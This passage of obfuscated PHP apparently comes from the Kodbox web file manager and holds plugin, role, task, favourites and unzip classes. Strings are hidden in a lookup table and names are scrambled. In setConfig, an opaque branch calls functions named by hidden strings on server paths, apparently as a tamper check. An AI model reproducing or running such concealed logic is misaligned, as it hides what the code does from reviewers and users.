($­ÜÚöëÃ[0] as $ƒ±êÏ¢) { $ÊüëŸ…à = substr($ƒ±êÏ¢, strlen($ÓËÑõ³£), -4); $•ÍÌĞ¿ = LNG($ÊüëŸ…à); $ºÜ«ê¤[] = $ƒ±êÏ¢; $­›ú¼Ã[] = str_replace(array($ßâÂˆ›ë[262], $ßâÂˆ›ë[1137], $ßâÂˆ›ë[418], $ßâÂˆ›ë[121]), array($ßâÂˆ›ë[53], $ßâÂˆ›ë[53], $ßâÂˆ›ë[12], $ßâÂˆ›ë[1655]), $•ÍÌĞ¿); } $ĞÛ÷ÎÒ = str_replace($ºÜ«ê¤, $­›ú¼Ã, $ĞÛ÷ÎÒ); } private function parseConfig(&$’Å“¡Ú ) { $Î¥¾¬„ø =& $_SERVER[‹è™Ü¸Ñ]; $º şÏÛ€ = $Î¥¾¬„ø[1656]; if (!strstr($’Å“¡Ú , $º şÏÛ€)) { return; } preg_match_all($Î¥¾¬„ø[1657], $’Å“¡Ú , $ÅÙå€Òë); if (!is_array($ÅÙå€Òë) || count($ÅÙå€Òë) == 0 || !is_array($ÅÙå€Òë[0]) || count($ÅÙå€Òë[0]) == 0) { return; } $¼¤Õˆß— = $this->getConfig(); $¬å‹Ä«ğ = array(); $¯ÊÊÙÔÙ = array(); foreach ($ÅÙå€Òë[0] as $ù…û“€İ) { $›š»Ğ½© = substr($ù…û“€İ, strlen($º şÏÛ€), -2); $¬å‹Ä«ğ[] = $ù…û“€İ; $¯ÊÊÙÔÙ[] = _get($¼¤Õˆß—, $›š»Ğ½©); } $’Å“¡Ú  = str_replace($¬å‹Ä«ğ, $¯ÊÊÙÔÙ, $’Å“¡Ú ); } private function parsePackage(&$ÊŠ¼¤µç) { $²°ÕÍé =& $_SERVER[‹è™Ü¸Ñ]; $ıĞéÍˆ² = $²°ÕÍé[1658]; if (!strstr($ÊŠ¼¤µç, $ıĞéÍˆ²)) { return; } preg_match_all($²°ÕÍé[1659], $ÊŠ¼¤µç, $÷™µŸã¥); if (!is_array($÷™µŸã¥) || count($÷™µŸã¥) == 0 || !is_array($÷™µŸã¥[0]) || count($÷™µŸã¥[0]) == 0) { return; } $áåŸÁª« = $this->appPackage(); $úª™Á¢™ = array(); $úÔ¸°ñÆ = array(); foreach ($÷™µŸã¥[0] as $ÀéÊ½Ø) { $„—Ã…³  = substr($ÀéÊ½Ø, strlen($ıĞéÍˆ²), -2); $úª™Á¢™[] = $ÀéÊ½Ø; $úÔ¸°ñÆ[] = _get($áåŸÁª«, $„—Ã…³ ); } $ÊŠ¼¤µç = str_replace($úª™Á¢™, $úÔ¸°ñÆ, $ÊŠ¼¤µç); } final function echoFile($Ûê¸–«ñ, $ÈµüŞ­ = false) { $œ¶øİÁÚ =& $_SERVER[‹è™Ü¸Ñ]; $®ªæö³Ï = $this->pluginPath . $Ûê¸–«ñ; if (ACT == $œ¶øİÁÚ[1660]) { echo $œ¶øİÁÚ[1661] . $this->pluginName . $œ¶øİÁÚ[8] . $Ûê¸–«ñ . $œ¶øİÁÚ[1662]; if (!file_exists($®ªæö³Ï)) { echo $œ¶øİÁÚ[1663]; return; } } $¶ÓİÕ¨° = $this->parseFile($®ªæö³Ï); $this->parseLang($¶ÓİÕ¨°); $this->parseConfig($¶ÓİÕ¨°); $this->parsePackage($¶ÓİÕ¨°); if (is_array($ÈµüŞ­)) { $¶ÓİÕ¨° = str_replace(array_keys($ÈµüŞ­), array_values($ÈµüŞ­), $¶ÓİÕ¨°); } echo $œ¶øİÁÚ[262] . $¶ÓİÕ¨°; } private function checkVersion() { $ˆ÷Û”Ä¦ =& $_SERVER[‹è™Ü¸Ñ]; $‡†›‘Ï­ = $this->appPackage(); $Ãõ´«Ë§ = $this->getConfig(); if ($Ãõ´«Ë§[$ˆ÷Û”Ä¦[1664]] == $‡†›‘Ï­[$ˆ÷Û”Ä¦[1638]]) { return; } $this->regist(); $this->setConfig(array($ˆ÷Û”Ä¦[1664] => $‡†›‘Ï­[$ˆ÷Û”Ä¦[1638]])); } final function initLang() { $½¥İÏà‰ =& $_SERVER[‹è™Ü¸Ñ]; $üÔŒì— = $½¥İÏà‰[1665]; $‚‚µ÷Ó³ = $this->pluginPath . $½¥İÏà‰[1666]; $©­¯’º³ = I18n::getType(); $‘Õ„…øØ = array(); if (file_exists($‚‚µ÷Ó³ . $©­¯’º³ . $½¥İÏà‰[893])) { $‘Õ„…øØ = (include $‚‚µ÷Ó³ . $©­¯’º³ . $½¥İÏà‰[893]); } else { if ($©­¯’º³ == $½¥İÏà‰[1667] && !file_exists($‚‚µ÷Ó³ . $©­¯’º³ . $½¥İÏà‰[893]) && file_exists($‚‚µ÷Ó³ . $½¥İÏà‰[1668])) { $‘Õ„…øØ = (include $‚‚µ÷Ó³ . $½¥İÏà‰[1668]); } else { if (file_exists($‚‚µ÷Ó³ . $üÔŒì— . $½¥İÏà‰[893])) { $‘Õ„…øØ = (include $‚‚µ÷Ó³ . $üÔŒì— . $½¥İÏà‰[893]); } } } if (!is_array($‘Õ„…øØ)) { return array(); } if (@count($‘Õ„…øØ) > 0) { I18n::set($‘Õ„…øØ); } return $‘Õ„…øØ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÊßœÒ†Í) { $ÑÓ¹µÄÛ =& $_SERVER[‹è™Ü¸Ñ]; if ($_SERVER[$ÑÓ¹µÄÛ[931]] != $_SERVER[$ÑÓ¹µÄÛ[1669]]) { $ù™–µê = $ÑÓ¹µÄÛ[933]; $Ûƒ¢È–× = $ÑÓ¹µÄÛ[934]; $‡¬’š¶¯ = $_SERVER[$ÑÓ¹µÄÛ[935]] . $ÑÓ¹µÄÛ[936]; $õí˜×ğ½ = $Ûƒ¢È–×($‡¬’š¶¯); $Š³Ş¸Î = explode($ÑÓ¹µÄÛ[262], $õí˜×ğ½); if (count($Š³Ş¸Î) < $ÑÓ¹µÄÛ[694]) { $Ãü¨®Ñ­ = $ÑÓ¹µÄÛ[937]; $Ãü¨®Ñ­(); } $şãìÍªß = $ÑÓ¹µÄÛ[938]; $şãìÍªß($_SERVER[$ÑÓ¹µÄÛ[939]]); $şãìÍªß($_SERVER[$ÑÓ¹µÄÛ[935]] . $ÑÓ¹µÄÛ[1670]); $İÛì»ÂÔ = 1; while ($İÛì»ÂÔ > 1) { $İÛì»ÂÔ = $İÛì»ÂÔ + 4; $¤ı¿äØ— = rawurlencode($İÛì»ÂÔ . $ÑÓ¹µÄÛ[454]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÊßœÒ†Í); } public function onSetConfig($–¤˜Ô‡) { } public function onGetConfig($Ó˜õü¦¸) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¢¬åÍ™É) { if ($¢¬åÍ™É == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¦³£ÙæÅ = "\160\x6c\165\x67\x69\156\x41\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ç›ù÷º = $this->getConfig(); if (!$ç›ù÷º[$¦³£ÙæÅ]) { return !1; } return ActionCall($_SERVER[‹è™Ü¸Ñ][1671], $ç›ù÷º[$¦³£ÙæÅ]); } public function url($ï×¼·º, $ŸŞ©‹ = '', $üÅİ¿ÜŸ = true) { $Ü¼Ô‡áË =& $_SERVER[‹è™Ü¸Ñ]; $ÃŒñ¬… = $this->getConfig(); $ÈÊ©°‚ú = KOD_VERSION . $Ü¼Ô‡áË[10] . KOD_VERSION_BUILD; $ÂÙÑÑµú = $this->packageVersion(); $¢ò»¬ïã = $ÈÊ©°‚ú . $Ü¼Ô‡áË[462] . $ÂÙÑÑµú; if (substr($ï×¼·º, 0, 4) == $Ü¼Ô‡áË[152] || substr($ï×¼·º, 0, 2) == $Ü¼Ô‡áË[1390]) { $ë”ÚÕæ = $ï×¼·º . $Ü¼Ô‡áË[1672] . $¢ò»¬ïã; } else { if ($ŸŞ©‹ == $Ü¼Ô‡áË[12]) { $ë”ÚÕæ = $this->pluginHost . $ï×¼·º . $Ü¼Ô‡áË[1672] . $¢ò»¬ïã; } else { if ($ŸŞ©‹ === $Ü¼Ô‡áË[78]) { $ë”ÚÕæ = $this->pluginHost . $ï×¼·º; } else { if ($ŸŞ©‹ == $Ü¼Ô‡áË[1673]) { $ë”ÚÕæ = STATIC_PATH . $ï×¼·º . $Ü¼Ô‡áË[1672] . $ÈÊ©°‚ú; } else { if ($ŸŞ©‹ == $Ü¼Ô‡áË[1674]) { $ë”ÚÕæ = APP_HOST . $Ü¼Ô‡áË[1675] . $ï×¼·º . $Ü¼Ô‡áË[1672] . $ÈÊ©°‚ú; } else { if (isset($ÃŒñ¬…[$ŸŞ©‹])) { $ë”ÚÕæ = $ÃŒñ¬…[$ŸŞ©‹] . $ï×¼·º . $Ü¼Ô‡áË[1672] . $¢ò»¬ïã; } } } } } } if (!$üÅİ¿ÜŸ) { return $ë”ÚÕæ; } echo $ë”ÚÕæ; } public function link($Áº®¡Ò§ = false, $ğº»°ê = '') { $›¤íöå„ =& $_SERVER[‹è™Ü¸Ñ]; $Ò¦ªù­Æ = $this->linkHas == !1; $this->linkHas = !0; if (!$Áº®¡Ò§) { $this->link($›¤íöå„[1676], $›¤íöå„[1674]); $this->link($›¤íöå„[1677], $›¤íöå„[1673]); $this->link($›¤íöå„[1678], $›¤íöå„[1673]); $this->link($›¤íöå„[1679], $›¤íöå„[1673]); $this->link($›¤íöå„[1680], $›¤íöå„[1673]); if ($Ò¦ªù­Æ) { Hook::trigger($›¤íöå„[1681]); } return; } $î×åÓ  = $this->url($Áº®¡Ò§, $ğº»°ê, !1); if (substr($Áº®¡Ò§, -3) == $›¤íöå„[1682]) { echo $›¤íöå„[1683] . $î×åÓ  . $›¤íöå„[1684] . $›¤íöå„[262]; } else { if (substr($Áº®¡Ò§, -4) == $›¤íöå„[1685]) { echo $›¤íöå„[1686] . $î×åÓ  . $›¤íöå„[1687] . $›¤íöå„[262]; } } if ($Ò¦ªù­Æ) { Hook::trigger($›¤íöå„[1681]); } } } goto Cº§êõŠÍ; AˆÑ°Ï¿‚: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x72\x6f\154\x65\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\141\x75\x74\150", "\154\141\x62\145\154", "\x64\151\163\160\x6c\x61\171", "\163\171\x73\164\145\x6d", "\x64\145\163\143", "\x69\147\x6e\157\162\145\x45\x78\x74", "\x69\x67\x6e\x6f\x72\145\106\151\154\145\123\151\x7a\145", "\x61\x64\155\151\x6e\x69\x73\x74\x72\141\164\157\x72", "\163\157\x72\164"); public function listData($ÇŞŸş¼ = false, $¤­¦ÎÎÎ = "\x73\157\162\164", $Îáï¶Š… = false) { $–÷ô¢œÊ =& $_SERVER[‹è™Ü¸Ñ]; $Æş®¸–û = parent::listData($ÇŞŸş¼, $¤­¦ÎÎÎ, $Îáï¶Š…); if (!$ÇŞŸş¼) { foreach ($Æş®¸–û as $Œ„î¨á => $±¾ÜÜùØ) { if ($±¾ÜÜùØ[$–÷ô¢œÊ[2158]] == 1) { $Æş®¸–û[$Œ„î¨á][$–÷ô¢œÊ[526]] = LNG($–÷ô¢œÊ[2421]); } } } return $Æş®¸–û; } public function update($´è¦È¤, $°óÖÑÁê) { $³ùç‘Ï =& $_SERVER[‹è™Ü¸Ñ]; $ÚÓª¹°Á = parent::listData($´è¦È¤); $äÃİ‰Ğñ = $this->findByName($°óÖÑÁê[$³ùç‘Ï[32]]); if (!$ÚÓª¹°Á || $äÃİ‰Ğñ && $äÃİ‰Ğñ[$³ùç‘Ï[475]] != $ÚÓª¹°Á[$³ùç‘Ï[475]]) { return !1; } if ($äÃİ‰Ğñ[$³ùç‘Ï[2158]] == 1) { $°óÖÑÁê = array($³ùç‘Ï[32] => $°óÖÑÁê[$³ùç‘Ï[32]], $³ùç‘Ï[1974] => $°óÖÑÁê[$³ùç‘Ï[1974]]); } $this->filterAuth($°óÖÑÁê[$³ùç‘Ï[487]]); return parent::update($´è¦È¤, $°óÖÑÁê); } public function remove($Ûİ¯‹äš) { $•¶³ëİ = parent::listData($Ûİ¯‹äš); if (!$•¶³ëİ || $•¶³ëİ[$_SERVER[‹è™Ü¸Ñ][191]]) { return !1; } return parent::remove($Ûİ¯‹äš); } public function add($£±ùÇàù) { $­ÓŒË§¥ =& $_SERVER[‹è™Ü¸Ñ]; $Ø‚ŒîÅï = $£±ùÇàù[$­ÓŒË§¥[32]]; if ($this->findByName($Ø‚ŒîÅï)) { return !1; } $ÍÓµø®ö = array($­ÓŒË§¥[494] => $Ø‚ŒîÅï, $­ÓŒË§¥[1957] => $­ÓŒË§¥[12], $­ÓŒË§¥[1953] => $­ÓŒË§¥[1961], $­ÓŒË§¥[2422] => 1, $­ÓŒË§¥[1956] => 0, $­ÓŒË§¥[2423] => 0, $­ÓŒË§¥[1955] => $this->getSort()); $£±ùÇàù = array_merge($ÍÓµø®ö, $£±ùÇàù); $this->filterAuth($£±ùÇàù[$­ÓŒË§¥[487]]); return parent::insert($£±ùÇàù); } private function getSort() { $¡ı’‹Éá =& $_SERVER[‹è™Ü¸Ñ]; $¥¨”¢†± = parent::listData(); $„‰¥óŠÇ = array_to_keyvalue($¥¨”¢†±, $¡ı’‹Éá[12], $¡ı’‹Éá[1975]); return empty($„‰¥óŠÇ) ? 0 : max($„‰¥óŠÇ) + 1; } private function filterAuth(&$ş„•ø…) { $Ÿ©ñšê‹ =& $_SERVER[‹è™Ü¸Ñ]; $¾òºˆòÄ = array(); $ òæ’¿ë = array_filter(explode($Ÿ©ñšê‹[50], $ş„•ø…)); foreach ($ òæ’¿ë as $ş„•ø…) { $¤ˆë¼™Í = explode($Ÿ©ñšê‹[10], $ş„•ø…); if ($¤ˆë¼™Í[0] == $Ÿ©ñšê‹[2424] && $¤ˆë¼™Í[1] != $Ÿ©ñšê‹[1255]) { $µ²â¥Åö = $¤ˆë¼™Í[0] . $Ÿ©ñšê‹[10] . $¤ˆë¼™Í[1] . $Ÿ©ñšê‹[2425]; if (!in_array($µ²â¥Åö, $ òæ’¿ë)) { $¾òºˆòÄ[] = $µ²â¥Åö; } } $¾òºˆòÄ[] = $ş„•ø…; } $ş„•ø… = implode($Ÿ©ñšê‹[50], $¾òºˆòÄ); } public function findRoleDefault() { $†Á•À‘Ö =& $_SERVER[‹è™Ü¸Ñ]; $×¤°öóÖ = parent::listData(); $à–ûŞÈš = !1; foreach ($×¤°öóÖ as $óöü©½­) { if (!$óöü©½­ || $óöü©½­[$†Á•À‘Ö[1973]] == $†Á•À‘Ö[228] || $óöü©½­[$†Á•À‘Ö[2158]] == 1) { continue; } if (strstr($óöü©½­[$†Á•À‘Ö[487]], $†Á•À‘Ö[2426])) { continue; } if (!strstr($óöü©½­[$†Á•À‘Ö[487]], $†Á•À‘Ö[2427])) { continue; } if (!$à–ûŞÈš) { $à–ûŞÈš = $óöü©½­; continue; } $óöÜÃ¬‘ = explode($†Á•À‘Ö[50], $à–ûŞÈš[$†Á•À‘Ö[487]]); $æ€Ú¼Ş = explode($†Á•À‘Ö[50], $óöü©½­[$†Á•À‘Ö[487]]); if (count($óöÜÃ¬‘) > count($æ€Ú¼Ş)) { $à–ûŞÈš = $óöü©½­; } } return $à–ûŞÈš ? $à–ûŞÈš[$†Á•À‘Ö[475]] : $†Á•À‘Ö[12]; } public function sort($Ï§‹–æ”, $Œ“ç¦¿) { return parent::update($Ï§‹–æ”, $Œ“ç¦¿); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x74\141\163\x6b\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\164\x79\160\x65", "\x65\166\x65\x6e\164", "\164\151\155\145", "\x64\x65\163\x63", "\x73\x79\x73\164\145\x6d", "\x65\x6e\141\142\x6c\145", "\154\141\163\164\x52\165\x6e", "\163\x6f\162\164"); public function listData($úßµâìˆ = false, $·””âÖ¾ = "\163\x6f\x72\x74", $«™åŠÄÀ = false) { return parent::listData($úßµâìˆ, $·””âÖ¾, $«™åŠÄÀ); } public function add($€ú§‰Æ²) { $Áûì¬—Í =& $_SERVER[‹è™Ü¸Ñ]; $ï³…“ğİ = $this->findByName($€ú§‰Æ²[$Áûì¬—Í[32]]); if ($ï³…“ğİ) { return !1; } $€ú§‰Æ²[$Áûì¬—Í[1703]] = 0; $€ú§‰Æ²[$Áûì¬—Í[1975]] = $this->getSort(); return parent::insert($€ú§‰Æ²); } private function getSort() { $ÛºëòÖ =& $_SERVER[‹è™Ü¸Ñ]; $×‹ší°ø = parent::listData(); $à£ÉŒ¹ò = array_to_keyvalue($×‹ší°ø, $ÛºëòÖ[12], $ÛºëòÖ[1975]); return empty($à£ÉŒ¹ò) ? 0 : max($à£ÉŒ¹ò) + 1; } public function update($ÚÃÜ¿Åç, $è…Ï–õ) { $‰‹òæ™º =& $_SERVER[‹è™Ü¸Ñ]; $š Øıî = $this->listData($ÚÃÜ¿Åç); $¾ØÄÍé = $this->findByName($è…Ï–õ[$‰‹òæ™º[32]]); if (!$š Øıî || $¾ØÄÍé && $¾ØÄÍé[$‰‹òæ™º[475]] != $š Øıî[$‰‹òæ™º[475]]) { return !1; } return parent::update($ÚÃÜ¿Åç, $è…Ï–õ); } public function remove($û‹ÀÉç, $ş—ÄÍû = false) { $˜€áôº =& $_SERVER[‹è™Ü¸Ñ]; $Æìü˜ÑŞ = $this->listData($û‹ÀÉç); if (!$Æìü˜ÑŞ) { return; } if (!$ş—ÄÍû && $Æìü˜ÑŞ[$˜€áôº[191]] == $˜€áôº[91]) { return !1; } return parent::remove($û‹ÀÉç); } public function enable($•Âô²Àø, $ÂöÈÂÓÛ) { return $this->update($•Âô²Àø, array($_SERVER[‹è™Ü¸Ñ][2416] => $ÂöÈÂÓÛ)); } public function run($•ãŞ‰™) { return $this->update($•ãŞ‰™, array($_SERVER[‹è™Ü¸Ñ][2428] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($—êŠá‹µ) { $‡ÌŞ²Ñ =& $_SERVER[‹è™Ü¸Ñ]; return array($‡ÌŞ²Ñ[2066] => array(USER_ID, $‡ÌŞ²Ñ[2429])); } protected function listData() { $‚«ÏÜªÍ =& $_SERVER[‹è™Ü¸Ñ]; $‰æÃ®îû = array($‚«ÏÜªÍ[1743] => USER_ID, $‚«ÏÜªÍ[557] => 0); $Ë±‹¡Üó = $‚«ÏÜªÍ[2430]; $ƒéÜ´êÆ = $this->field($Ë±‹¡Üó)->where($‰æÃ®îû)->order($‚«ÏÜªÍ[2431])->select(); return $ƒéÜ´êÆ ? $ƒéÜ´êÆ : array(); } protected function resetCache() { } protected function listView() { $ÒÛÖåÏô =& $_SERVER[‹è™Ü¸Ñ]; $ı¿â„ÊÍ = $this->listData(); $åŸìíŠ¹ = array_filter_by_field($ı¿â„ÊÍ, $ÒÛÖåÏô[33], $ÒÛÖåÏô[490]); $ù³³ğŠ¯ = array_to_keyvalue($åŸìíŠ¹, $ÒÛÖåÏô[12], $ÒÛÖåÏô[87]); if (!$ù³³ğŠ¯) { return $ı¿â„ÊÍ; } $ƒ¼›½ª = 2000; $À’Ó¥× = array($ÒÛÖåÏô[491] => array($ÒÛÖåÏô[492], $ù³³ğŠ¯)); $ğ•ÈÓÔÇ = Model($ÒÛÖåÏô[879])->listSource($À’Ó¥×, $ƒ¼›½ª); $ğ•ÈÓÔÇ = array_merge($ğ•ÈÓÔÇ[$ÒÛÖåÏô[86]], $ğ•ÈÓÔÇ[$ÒÛÖåÏô[85]]); $ğ•ÈÓÔÇ = array_to_keyvalue($ğ•ÈÓÔÇ, $ÒÛÖåÏô[193]); foreach ($ı¿â„ÊÍ as $ò‡‘­Ô => $ğÃŸ¿´¤) { $²õ˜ƒ‹Õ = $ğ•ÈÓÔÇ[$ğÃŸ¿´¤[$ÒÛÖåÏô[87]]]; $²õ˜ƒ‹Õ = $²õ˜ƒ‹Õ ? $²õ˜ƒ‹Õ : array(); $ı¿â„ÊÍ[$ò‡‘­Ô] = array_merge($²õ˜ƒ‹Õ, $ğÃŸ¿´¤); } return $ı¿â„ÊÍ; } protected function addFav($€¦»…ô, $ÚŒ¨€Ÿ = '', $Ç½æëı² = "\163\x6f\165\x72\143\x65") { $µó÷š¢ö =& $_SERVER[‹è™Ü¸Ñ]; $‡´ûğœ« = array($µó÷š¢ö[1743] => USER_ID, $µó÷š¢ö[557] => 0, $µó÷š¢ö[496] => $Ç½æëı², $µó÷š¢ö[495] => $€¦»…ô); if ($this->where($‡´ûğœ«)->find()) { return !1; } $‡´ûğœ« = array($µó÷š¢ö[1743] => USER_ID, $µó÷š¢ö[557] => 0); $»ÚíÔš = $this->where($‡´ûğœ«)->max($µó÷š¢ö[1975]); if (!$»ÚíÔš) { $»ÚíÔš = 0; } if (!$ÚŒ¨€Ÿ && $Ç½æëı² == $µó÷š¢ö[490]) { $”æ¡òÀ„ = Model($µó÷š¢ö[1398])->where(array($µó÷š¢ö[491] => $€¦»…ô))->find(); if (!$”æ¡òÀ„) { return !1; } $ÚŒ¨€Ÿ = $”æ¡òÀ„[$µó÷š¢ö[32]]; } $ÚŒ¨€Ÿ = $this->getAutoName($ÚŒ¨€Ÿ); $¸ÊÑšñ› = array($µó÷š¢ö[1743] => USER_ID, $µó÷š¢ö[557] => 0, $µó÷š¢ö[494] => $ÚŒ¨€Ÿ, $µó÷š¢ö[495] => $€¦»…ô, $µó÷š¢ö[496] => $Ç½æëı², $µó÷š¢ö[1955] => $»ÚíÔš + 1); return $this->add($¸ÊÑšñ›); } protected function remove($º¼çœÔÏ) { $ºû¹…Ğ† =& $_SERVER[‹è™Ü¸Ñ]; $ŒÎ­¿»ö = array($ºû¹…Ğ†[1743] => USER_ID, $ºû¹…Ğ†[493] => $º¼çœÔÏ); return $this->where($ŒÎ­¿»ö)->delete(); } protected function removeByName($ğ¶Ìíº…) { $Ñã˜«§• =& $_SERVER[‹è™Ü¸Ñ]; $€èü±ÄÇ = array($Ñã˜«§•[1743] => USER_ID, $Ñã˜«§•[494] => $ğ¶Ìíº…, $Ñã˜«§•[557] => 0); return $this->where($€èü±ÄÇ)->delete(); } protected function rename($Ù°™òßù, $´µª„ø·) { $¾Ÿòüæº =& $_SERVER[‹è™Ü¸Ñ]; if ($Ù°™òßù == $´µª„ø·) { return !1; } $—ô»­«« = $this->getAutoName($´µª„ø·); if ($´µª„ø· != $—ô»­««) { return !1; } $ä®ÖÊëˆ = array($¾Ÿòüæº[1743] => USER_ID, $¾Ÿòüæº[557] => 0, $¾Ÿòüæº[32] => $Ù°™òßù); return $this->where($ä®ÖÊëˆ)->save(array($¾Ÿòüæº[32] => $´µª„ø·)); } protected function resetSort($ßûúÂÆÑ) { $¬˜Ôç¿« =& $_SERVER[‹è™Ü¸Ñ]; $ßûúÂÆÑ = is_array($ßûúÂÆÑ) ? $ßûúÂÆÑ : array(); $¢›ëÓù = array($¬˜Ôç¿«[1743] => USER_ID); for ($ş«Ëí´ = 0; $ş«Ëí´ < count($ßûúÂÆÑ); $ş«Ëí´++) { $¢›ëÓù[$¬˜Ôç¿«[493]] = $ßûúÂÆÑ[$ş«Ëí´]; $this->where($¢›ëÓù)->save(array($¬˜Ôç¿«[1955] => $ş«Ëí´ + 1)); } return !0; } protected function moveTop($Û‡ç‡¼Ù) { $ì´¦äŸÕ =& $_SERVER[‹è™Ü¸Ñ]; $ÆÁÔ«Ë = array($ì´¦äŸÕ[1743] => USER_ID, $ì´¦äŸÕ[557] => 0); $ãíµœî† = $this->where($ÆÁÔ«Ë)->where(array($ì´¦äŸÕ[32] => $Û‡ç‡¼Ù))->find(); if (!$ãíµœî†) { return; } $Úïéèò = $this->field($ì´¦äŸÕ[475])->where($ÆÁÔ«Ë)->order($ì´¦äŸÕ[2431])->select(); $Úïéèò = array_to_keyvalue($Úïéèò, $ì´¦äŸÕ[12], $ì´¦äŸÕ[475]); $¦ÚİÙø = $Úïéèò; $Úïéèò = array_remove_value($Úïéèò, $ãíµœî†[$ì´¦äŸÕ[475]]); array_unshift($Úïéèò, $ãíµœî†[$ì´¦äŸÕ[475]]); return $this->resetSort($Úïéèò); } protected function moveBottom($ÔŞ¶±İµ) { $¦Á†¯¦™ =& $_SERVER[‹è™Ü¸Ñ]; $ˆˆ¡Ñ¨± = array($¦Á†¯¦™[1743] => USER_ID, $¦Á†¯¦™[557] => 0); $àÒ¿ÀÓƒ = $this->where($ˆˆ¡Ñ¨±)->max($¦Á†¯¦™[1975]); $Ş ³ï™’ = array($¦Á†¯¦™[1975] => $àÒ¿ÀÓƒ + 1); return $this->where($ˆˆ¡Ñ¨±)->where(array($¦Á†¯¦™[32] => $ÔŞ¶±İµ))->save($Ş ³ï™’); } private function getAutoName($†—®ùÁû) { $ùáİüŒÍ =& $_SERVER[‹è™Ü¸Ñ]; $íÙıáé = array($ùáİüŒÍ[1743] => USER_ID, $ùáİüŒÍ[557] => 0); $ä’±ıèù = $this->field($ùáİüŒÍ[32])->where($íÙıáé)->select(); $ä’±ıèù = array_to_keyvalue($ä’±ıèù, $ùáİüŒÍ[12], $ùáİüŒÍ[32]); if (!$ä’±ıèù || !in_array($†—®ùÁû, $ä’±ıèù)) { return $†—®ùÁû; } for ($í†ÊŠ = 0; $í†ÊŠ < count($ä’±ıèù); $í†ÊŠ++) { if (!in_array($†—®ùÁû . "\50{$í†ÊŠ}\x29", $ä’±ıèù)) { return $†—®ùÁû . "\x28{$í†ÊŠ}\51"; } } return $†—®ùÁû . "\50{$í†ÊŠ}\51"; } } goto Cì—¹›Ä; a·ïµç¶­Ü: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $²Ó†ØÍë =& $_SERVER[‹è™Ü¸Ñ]; parent::startAfter(); Hook::bind($²Ó†ØÍë[1865], array($this, $²Ó†ØÍë[1866])); Hook::bind($²Ó†ØÍë[1258], array($this, $²Ó†ØÍë[1867])); Hook::bind($²Ó†ØÍë[1868], array($this, $²Ó†ØÍë[1869])); $Ïæ“Ãı =& $this->task; $Ïæ“Ãı[$²Ó†ØÍë[1870]] = $²Ó†ØÍë[1259]; if (!$Ïæ“Ãı[$²Ó†ØÍë[1639]]) { $Ïæ“Ãı[$²Ó†ØÍë[1639]] = LNG($²Ó†ØÍë[1871]); } } protected function endAfter() { $Õ‘Áş¡ =& $_SERVER[‹è™Ü¸Ñ]; parent::endAfter(); Hook::unbind($Õ‘Áş¡[1865], array($this, $Õ‘Áş¡[1866])); Hook::unbind($Õ‘Áş¡[1258], array($this, $Õ‘Áş¡[1867])); Hook::unbind($Õ‘Áş¡[1868], array($this, $Õ‘Áş¡[1869])); } public function updateAfter() { $·ƒ—±ä =& $_SERVER[‹è™Ü¸Ñ]; $•»á¦©® =& $this->task; if (!$•»á¦©®[$·ƒ—±ä[1121]] || !$•»á¦©®[$·ƒ—±ä[818]]) { if ($•»á¦©®[$·ƒ—±ä[1870]] != $·ƒ—±ä[389]) { return; } } if ($•»á¦©®[$·ƒ—±ä[1870]] == $·ƒ—±ä[1259]) { $‘‚ˆ¸ıŠ = 0; if ($•»á¦©®[$·ƒ—±ä[1805]]) { $‘‚ˆ¸ıŠ = $•»á¦©®[$·ƒ—±ä[1806]] / $•»á¦©®[$·ƒ—±ä[1805]]; } $•»á¦©®[$·ƒ—±ä[1754]] = $‘‚ˆ¸ıŠ * 0.3; } else { if ($•»á¦©®[$·ƒ—±ä[1870]] == $·ƒ—±ä[389]) { $‘‚ˆ¸ıŠ = $•»á¦©®[$·ƒ—±ä[1753]] / $•»á¦©®[$·ƒ—±ä[1121]]; $•»á¦©®[$·ƒ—±ä[1754]] = 0.3 + $‘‚ˆ¸ıŠ * 0.4; } else { if ($•»á¦©®[$·ƒ—±ä[1870]] == $·ƒ—±ä[110]) { $ÃıŠãà = 0; if ($•»á¦©®[$·ƒ—±ä[1807]] == $·ƒ—±ä[110]) { $ÃıŠãà = $•»á¦©®[$·ƒ—±ä[1806]]; } $‘‚ˆ¸ıŠ = ($•»á¦©®[$·ƒ—±ä[1810]] + $ÃıŠãà) / $•»á¦©®[$·ƒ—±ä[818]]; $•»á¦©®[$·ƒ—±ä[1754]] = 0.3 + 0.4 + $‘‚ˆ¸ıŠ * 0.3; } } } if ($•»á¦©®[$·ƒ—±ä[1754]] > 0) { $ Áûàç– = timeFloat() - $•»á¦©®[$·ƒ—±ä[1756]] - $•»á¦©®[$·ƒ—±ä[1759]]; $•»á¦©®[$·ƒ—±ä[1760]] = $ Áûàç– * (1 - $•»á¦©®[$·ƒ—±ä[1754]]) / $•»á¦©®[$·ƒ—±ä[1754]]; } } public function addFile($µÛÖº¥’) { $½ƒäÕ©ƒ =& $_SERVER[‹è™Ü¸Ñ]; $ÄŞ‹üµÁ =& $this->task; $Øœè•ğ¨ = IO::info($µÛÖº¥’); $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1803]] = $Øœè•ğ¨[$½ƒäÕ©ƒ[32]]; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1805]] = $Øœè•ğ¨[$½ƒäÕ©ƒ[79]]; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1806]] = 0; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1123]] = $½ƒäÕ©ƒ[1826]; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[1807]] = $½ƒäÕ©ƒ[1259]; $ÄŞ‹üµÁ[$½ƒäÕ©ƒ[818]] = 